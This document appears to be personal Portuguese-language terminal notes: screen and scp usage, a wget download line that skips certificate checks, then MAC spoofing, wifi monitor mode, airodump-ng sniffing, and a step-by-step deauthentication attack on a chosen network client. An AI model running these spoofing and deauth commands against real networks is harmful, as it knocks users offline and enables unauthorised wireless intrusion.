## SCREEN

|Funcionalidade|Comando|
|---|---|
|Criar Sessão|CTRL+a + CTRL+c|
|Detach Sessão|CTRL+a + CTRL+d|
|"Alt Tab" de sessões|CTRL+a + CTRL+a|
|Mudar para sessão por ID|CTRL+a + "|
|Split Vertical|CTRL+a + CTRL+\| |
|Split Horizontal|CTRL+a + CTRL+S |

```
# listar as sessoões:
screen -ls
```
```
# exucutar comando em nova sessão e dar detach:
screen -d -m COMMAND
```
```
# retach em sessão
screen -r [screen id]
```
```
# excluir uma sessão:
screen -X -S SESSION_ID quit
```
#

## WGET

```
# baixar arquivo do google drive pelo wget
wget --no-check-certificate 'https://docs.google.com/uc?export=download&id=[ID]' -O [NAME]
```

#

## SCP

```
# baixar folder remoto para local via ssh, com scp:
scp -r user@host:[/path/to/folder/] [local-copy-of-folder]
```
```
# baixar arquivo remoto para local via ssh, com scp:
scp user@host:[/path/to/folder/file.name] [local-copy-of-folder]
```
```
# enviar arquivo local para remoto via ssh, com scp:
scp [local-copy-of-folder/file.name] user@host:[/path/to/folder/]
```

#

## MAC change

```
ifconfig wlan1 down
ifconfig wlan1 hw ether 00:11:22:33:44:55
ifconfig wlan1 up
```

## Monitor Mode

```
ifconfig wlan1 down
iwconfig wlan1 mode monitor
ifconfig wlan1 up
```

## Sniffing

|||
|-|-|
|BSSID|mac|
|PWR|força do sinal|
|Beacons|broadcast existencia da rede|
|#Data|total de dados trafegados|
|#/s|total de dados trafegados por segundo|
|CH|canal da rede|
|MB|velocidade máxima suportada|
|ENC|encriptação da rede|
|CIPHER|cifra da rede|
|AUTH|autenticação utilizada|
|ESSID|nome da rede|
|STATION|cliente conectado na rede|

### Tudo
```
# interface de rede wifi precisa estar em modo monitor
airodump-ng wlan1
```

### Rede espefífica
```
# interface de rede wifi precisa estar em modo monitor
airodump-ng --channel [canal] --bssid [mac] --write [output file] wlan1
```

## Deauth

1. Listar redes e escolher alvo
```
airodump-ng wlan1
```

2. Sniffar o alvo. Escolha o client alvo. **Deixe o terminal aberto**
```
airodump-ng --channel 1 --bssid 00:11:22:33:44:55 wlan1
```

3. Realizar deauth
```
aireplay-ng --deauth 10000000 -a [bssid rede] -c [mac client] wlan1
```
